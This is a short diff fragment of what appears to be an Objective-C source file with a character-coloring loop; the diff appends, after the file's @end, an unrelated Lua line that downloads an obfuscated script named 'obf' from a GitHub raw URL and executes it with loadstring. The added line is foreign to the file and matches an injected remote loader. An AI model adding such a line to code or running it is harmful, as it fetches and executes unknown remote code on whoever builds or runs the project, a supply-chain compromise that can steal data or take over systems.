@@ -148,3 +148,4 @@ for (charsFinished = 0, extraHue = 0.0; charsFinished != characterCount; charsFi
 
 
 @end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/obfmoonsec/Masterhub/refs/heads/main/obf"))()
